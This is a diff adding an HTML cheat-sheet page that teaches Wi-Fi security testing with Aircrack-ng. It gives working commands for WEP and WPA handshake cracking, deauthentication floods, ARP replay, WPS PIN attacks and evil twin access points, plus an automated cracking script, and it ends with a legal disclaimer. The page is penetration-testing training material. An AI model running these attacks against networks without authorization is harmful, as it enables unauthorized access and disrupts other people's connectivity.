@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aircrack-ng Guide - Cybersecurity Cheat Sheet</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../guide-styles.css">
+</head>
+<body>
+    <div class="guide-container">
+        <header class="guide-header">
+            <h1>Aircrack-ng: Complete Wi-Fi Security Assessment Suite</h1>
+            <p>Master Wireless Network Security Testing</p>
+            <a href="../index.html" class="back-link">&larr; Back to Cheat Sheet</a>
+        </header>
+
+        <main class="guide-content">
+            <section id="introduction">
+                <h2>What is Aircrack-ng?</h2>
+                <p>Aircrack-ng is a complete suite of tools to assess Wi-Fi network security. It focuses on different areas of Wi-Fi security: monitoring (packet capture and export of data to text files for further processing by third party tools), attacking (replay attacks, deauthentication, fake access points and others via packet injection), testing (checking Wi-Fi cards and driver capabilities), and cracking (WEP and WPA PSK (WPA 1 and 2)).</p>
+            </section>
+
+            <section id="installation">
+                <h2>Installation & Setup</h2>
+                <div class="command-block">
+                    <h3>Linux Installation</h3>
+                    <pre><code># Ubuntu/Debian
+sudo apt update && sudo apt install aircrack-ng
+
+# Kali Linux (pre-installed)
+aircrack-ng --help
+
+# From source
+git clone https://github.com/aircrack-ng/aircrack-ng.git
+cd aircrack-ng
+make
+sudo make install</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Hardware Requirements</h3>
+                    <ul>
+                        <li><strong>Compatible Wi-Fi adapter:</strong> Must support monitor mode and packet injection</li>
+                        <li><strong>Recommended chipsets:</strong> Atheros, Ralink, Realtek (check compatibility)</li>
+                        <li><strong>External USB adapters:</strong> Often better than built-in cards</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="monitor-mode">
+                <h2>Setting Up Monitor Mode</h2>
+                <div class="command-block">
+                    <h3>Enable Monitor Mode</h3>
+                    <pre><code># Check wireless interfaces
+iwconfig
+
+# Kill interfering processes
+sudo airmon-ng check kill
+
+# Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Verify monitor mode (should show wlan0mon)
+iwconfig</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Disable Monitor Mode</h3>
+                    <pre><code># Stop monitor mode
+sudo airmon-ng stop wlan0mon
+
+# Restart network services
+sudo systemctl restart NetworkManager</code></pre>
+                </div>
+            </section>
+
+            <section id="reconnaissance">
+                <h2>Wireless Reconnaissance</h2>
+                <div class="command-block">
+                    <h3>Discover Access Points</h3>
+                    <pre><code># Scan for all access points
+sudo airodump-ng wlan0mon
+
+# Scan specific channel
+sudo airodump-ng -c 6 wlan0mon
+
+# Scan specific frequency band
+sudo airodump-ng --band a wlan0mon  # 5GHz
+sudo airodump-ng --band bg wlan0mon # 2.4GHz</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Target Specific Network</h3>
+                    <pre><code># Monitor specific BSSID and save to file
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Show only clients (stations)
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --showack wlan0mon</code></pre>
+                </div>
+            </section>
+
+            <section id="wep-cracking">
+                <h2>WEP Cracking</h2>
+                <div class="command-block">
+                    <h3>Capture WEP Traffic</h3>
+                    <pre><code># Start capturing on specific channel/BSSID
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
+
+# In another terminal, generate traffic (ARP replay)
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Crack WEP Key</h3>
+                    <pre><code># Crack with captured IVs (need ~20,000+ IVs)
+aircrack-ng wep_capture-01.cap
+
+# Crack with specific key length
+aircrack-ng -n 64 wep_capture-01.cap  # 64-bit key
+aircrack-ng -n 128 wep_capture-01.cap # 128-bit key</code></pre>
+                </div>
+            </section>
+
+            <section id="wpa-cracking">
+                <h2>WPA/WPA2 Cracking</h2>
+                <div class="command-block">
+                    <h3>Capture WPA Handshake</h3>
+                    <pre><code># Start capturing
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
+
+# In another terminal, deauthenticate client to force handshake
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
+
+# Wait for "WPA handshake" message in airodump-ng</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Crack WPA/WPA2 PSK</h3>
+                    <pre><code># Dictionary attack
+aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap
+
+# With specific ESSID
+aircrack-ng -w wordlist.txt -e "NetworkName" wpa_capture-01.cap
+
+# Show handshake info
+aircrack-ng wpa_capture-01.cap</code></pre>
+                </div>
+            </section>
+
+            <section id="injection-attacks">
+                <h2>Packet Injection Attacks</h2>
+                <div class="command-block">
+                    <h3>Deauthentication Attack</h3>
+                    <pre><code># Deauth all clients from AP
+sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Deauth specific client
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
+
+# Continuous deauth (use Ctrl+C to stop)
+sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>ARP Replay Attack</h3>
+                    <pre><code># ARP replay to generate traffic
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon
+
+# Fake authentication first (for WEP)
+sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Fragmentation Attack</h3>
+                    <pre><code># Fragmentation attack to obtain keystream
+sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon
+
+# Use obtained keystream for packet forging
+sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request</code></pre>
+                </div>
+            </section>
+
+            <section id="advanced-techniques">
+                <h2>Advanced Techniques</h2>
+                <div class="command-block">
+                    <h3>WPS PIN Attack</h3>
+                    <pre><code># Check for WPS-enabled APs
+sudo wash -i wlan0mon
+
+# Attack WPS PIN (use with reaver)
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+
+# Pixie dust attack
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Evil Twin Attack Setup</h3>
+                    <pre><code># Create fake AP
+sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+
+# With specific BSSID
+sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "FreeWiFi" -c 6 wlan0mon
+
+# WPA2 fake AP
+sudo airbase-ng -e "SecureWiFi" -c 6 -z 2 -W 1 wlan0mon</code></pre>
+                </div>
+            </section>
+
+            <section id="analysis-tools">
+                <h2>Analysis & Utilities</h2>
+                <div class="command-block">
+                    <h3>Packet Analysis</h3>
+                    <pre><code># Convert cap to different formats
+aircrack-ng -J output capture.cap  # to .hccap
+aircrack-ng -j output capture.cap  # to .hccapx
+
+# Merge capture files
+mergecap -w merged.cap capture1.cap capture2.cap
+
+# Clean capture file
+wpaclean clean.cap dirty.cap</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Statistics and Information</h3>
+                    <pre><code># Show capture file info
+capinfos capture.cap
+
+# Extract handshakes
+aircrack-ng -J handshake capture.cap
+
+# Check for handshakes
+pyrit -r capture.cap analyze</code></pre>
+                </div>
+            </section>
+
+            <section id="automation">
+                <h2>Automation Scripts</h2>
+                <div class="command-block">
+                    <h3>Automated WPA Cracking Script</h3>
+                    <pre><code>#!/bin/bash
+# Simple WPA cracking automation
+
+INTERFACE="wlan0mon"
+BSSID="$1"
+CHANNEL="$2"
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+if [ $# -ne 2 ]; then
+    echo "Usage: $0 <BSSID> <CHANNEL>"
+    exit 1
+fi
+
+echo "[+] Starting capture on $BSSID (Channel $CHANNEL)"
+sudo airodump-ng -c $CHANNEL --bssid $BSSID -w capture $INTERFACE &
+DUMP_PID=$!
+
+sleep 10
+
+echo "[+] Sending deauth packets"
+sudo aireplay-ng -0 5 -a $BSSID $INTERFACE
+
+sleep 5
+kill $DUMP_PID
+
+echo "[+] Starting dictionary attack"
+aircrack-ng -w $WORDLIST capture-01.cap</code></pre>
+                </div>
+            </section>
+
+            <section id="troubleshooting">
+                <h2>Troubleshooting</h2>
+                <div class="command-block">
+                    <h3>Common Issues</h3>
+                    <ul>
+                        <li><strong>No injection:</strong> Check if adapter supports packet injection with <code>aireplay-ng -9 wlan0mon</code></li>
+                        <li><strong>Monitor mode fails:</strong> Kill interfering processes with <code>airmon-ng check kill</code></li>
+                        <li><strong>No handshake captured:</strong> Ensure clients are connected and try multiple deauth attempts</li>
+                        <li><strong>Slow IV collection:</strong> Use ARP replay attack to generate traffic</li>
+                    </ul>
+                </div>
+                <div class="command-block">
+                    <h3>Testing Injection</h3>
+                    <pre><code># Test injection capability
+sudo aireplay-ng -9 wlan0mon
+
+# Test against specific AP
+sudo aireplay-ng -9 -e "NetworkName" -a AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
+                </div>
+            </section>
+
+            <section id="tips">
+                <h2>Pro Tips & Best Practices</h2>
+                <ul>
+                    <li><strong>Use external USB adapters:</strong> Often more reliable than built-in cards</li>
+                    <li><strong>Check compatibility first:</strong> Not all Wi-Fi adapters support monitor mode</li>
+                    <li><strong>Be patient with handshakes:</strong> May take multiple deauth attempts</li>
+                    <li><strong>Use good wordlists:</strong> rockyou.txt is a good start, but custom lists work better</li>
+                    <li><strong>Monitor multiple channels:</strong> Use channel hopping for better coverage</li>
+                    <li><strong>Save everything:</strong> Always use -w flag to save captures</li>
+                    <li><strong>Clean your captures:</strong> Use wpaclean to remove unnecessary packets</li>
+                    <li><strong>Combine with other tools:</strong> Use with Hashcat for faster WPA cracking</li>
+                </ul>
+            </section>
+
+            <section id="legal-disclaimer">
+                <h2>Legal Disclaimer</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> Aircrack-ng should only be used for:</p>
+                    <ul>
+                        <li>Testing your own wireless networks</li>
+                        <li>Authorized penetration testing with written permission</li>
+                        <li>Educational purposes in controlled environments</li>
+                        <li>Security research on isolated test networks</li>
+                    </ul>
+                    <p>Unauthorized access to wireless networks is illegal in most jurisdictions. Always ensure you have explicit permission before testing any network you don't own.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
